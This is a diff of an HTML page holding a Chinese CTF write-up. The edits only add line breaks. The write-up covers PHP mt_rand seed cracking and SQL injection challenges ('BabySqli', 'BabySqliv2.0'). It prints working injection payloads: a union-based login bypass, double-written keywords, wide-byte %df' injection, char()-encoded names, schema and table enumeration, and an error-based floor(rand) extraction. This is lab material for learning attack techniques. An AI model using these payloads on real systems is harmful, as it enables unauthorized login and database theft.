@@ -7670,7 +7670,7 @@ if(isset($_POST['num'])){
 show_source(&quot;check.php&quot;); 
 </code></pre>
 <p>其中 mt_rand() 会出现随机数安全问题，就是说如果播种的种子(seed)一样的话，那么产生的随机数实际上是不变的</p>
-<p>可以使用<a href="https://www.openwall.com/php_mt_seed/">这个</a>爆破出来
+<p>可以使用<a href="https://www.openwall.com/php_mt_seed/">这个</a>爆破出来<br />
 下下来直接解压以后在目录执行 <code>make</code> 命令，就可以使用了</p>
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580109862444-1021fdfc-7772-4a19-a8d6-180e4a1b8e20-020228.png" /></p>
 <p>拿源码来解释一下:</p>
@@ -7718,8 +7718,8 @@ print(res)
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580111834776-8ec6cbb3-0dec-43ee-87e7-da230a98c50b-043533.png" /></p>
 <h4 id="babysqli">BabySqli</h4>
 <p>尝试登录的话会返回账号错误还是密码错误，可以得出admin账号是存在的</p>
-<p>然后使用 union 万能密码绕过（MD5是123的MD5）
-<code>username：-1' union select 1, 'admin', '202cb962ac59075b964b07152d234b70' #</code>
+<p>然后使用 union 万能密码绕过（MD5是123的MD5）<br />
+<code>username：-1' union select 1, 'admin', '202cb962ac59075b964b07152d234b70' #</code><br />
 <code>password：123</code></p>
 <p>解释一下 union 万能密码，</p>
 <p>如果原来的查询语句是：</p>
@@ -7727,9 +7727,9 @@ print(res)
 $sql = &quot;SELECT * FROM users WHERE username='$username' and password = '&quot;.md5($password,true).&quot;'&quot;;
 ?&gt;
 </code></pre>
-<p>你输入的是：
-<code>username：-1' union select 1, 'admin', '202cb962ac59075b964b07152d234b70' #</code>
-<code>password：123</code>
+<p>你输入的是：<br />
+<code>username：-1' union select 1, 'admin', '202cb962ac59075b964b07152d234b70' #</code><br />
+<code>password：123</code><br />
 那这个语句就会被构造成：</p>
 <pre><code class="language-sql">select * from users where username='-1' union select 1, 'admin', '202cb962ac59075b964b07152d234b70' # and password='md5(123,true)';
 </code></pre>
@@ -7737,35 +7737,35 @@ $sql = &quot;SELECT * FROM users WHERE username='$username' and password = '&quo
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580115070848-9b1aa76c-1df3-4a55-8793-dd1d3079e25c-897736.png" /></p>
 <p>这样你输入的admin的密码就是你传的123的MD5值，就可以成功登陆了</p>
 <h4 id="babysqliv20">BabySqliv2.0</h4>
-<p>union 与 select 被置为空，双写绕过
-单引号回家反斜线转义，宽字节注入
+<p>union 与 select 被置为空，双写绕过<br />
+单引号回家反斜线转义，宽字节注入<br />
 admin 被检测，0x 被检测，使用 char(97,100,109,105,110)</p>
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580116062302-715fff91-011a-47c1-9d27-2daf78f51885-169664.png" /></p>
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580116111514-a9706c3e-1343-436f-967a-dbbc80895d80-365621.png" /></p>
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580116148916-b606298d-2013-4f38-8b06-79db29d9a171-568135.png" /></p>
-<p>爆库名：web_sqli
-username：1%df' ununionion selselectect 1,char(97,100,109,105,110),group_concat(schema_name) from information_schema.schemata%23
-password：随意
+<p>爆库名：web_sqli<br />
+username：1%df' ununionion selselectect 1,char(97,100,109,105,110),group_concat(schema_name) from information_schema.schemata%23<br />
+password：随意<br />
 <img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580116969464-6b711142-87c9-4fc7-bc5d-6e80986e61c8-830246.png" /></p>
-<p>爆表名：f14g
-username：1%df' ununionion selselectect 1,char(97,100,109,105,110),group_concat(table_name) from information_schema.tables whwhereere table_schema=char(119,101,98,95,115,113,108,105)%23
-password：随意
+<p>爆表名：f14g<br />
+username：1%df' ununionion selselectect 1,char(97,100,109,105,110),group_concat(table_name) from information_schema.tables whwhereere table_schema=char(119,101,98,95,115,113,108,105)%23<br />
+password：随意<br />
 <img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580117953030-380e3b54-68e7-4349-9549-3812f522d8b0-065963.png" /></p>
-<p>爆字段名：
-username：1%df' ununionion selselectect 1,char(97,100,109,105,110),group_concat(column_name) from information_schema.columns whwhereere table_name=char(102,49,52,103)%23
-password：随意
+<p>爆字段名：<br />
+username：1%df' ununionion selselectect 1,char(97,100,109,105,110),group_concat(column_name) from information_schema.columns whwhereere table_name=char(102,49,52,103)%23<br />
+password：随意<br />
 <img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580118122410-b91f82ba-56b9-46e7-8da2-8586384abf23-861555.png" /></p>
-<p>爆flag：
-username：1%df' uniunionon selselectect 1,char(97,100,109,105,110),group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g%23
-password：随意
+<p>爆flag：<br />
+username：1%df' uniunionon selselectect 1,char(97,100,109,105,110),group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g%23<br />
+password：随意<br />
 <img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580119487562-e74dcab9-9f70-4126-8274-80ee20e569c3-046137.png" /></p>
 <p>解出来全是歌词？？为啥我的没有flag???</p>
 <p><img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580119511250-691be6bc-5491-4987-8ffc-b8281fba95d9-316531.png" /></p>
-<p>使用：
-username：%df'
-and(seselectlect 1 from(sselectelect count(<em>),concat((sselectelect (sselectelect (SESELECTLECT  concat(327a6c4304ad5938eaf0efb6cc3e53dc) FROM f14g limit 22,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)--+
-password：随意
-可以得到！！！
+<p>使用：<br />
+username：%df'<br />
+and(seselectlect 1 from(sselectelect count(<em>),concat((sselectelect (sselectelect (SESELECTLECT  concat(327a6c4304ad5938eaf0efb6cc3e53dc) FROM f14g limit 22,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a)--+<br />
+password：随意<br />
+可以得到！！！<br />
 <img alt="image.png" src="../img/551828_qs7nwl3y83rezcee/1580120622563-c78012b7-a10e-4f8c-981f-cbd109ac8e81-429899.png" /></p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/hwfzx2">https://www.yuque.com/hxfqg9/web/hwfzx2</a></p>
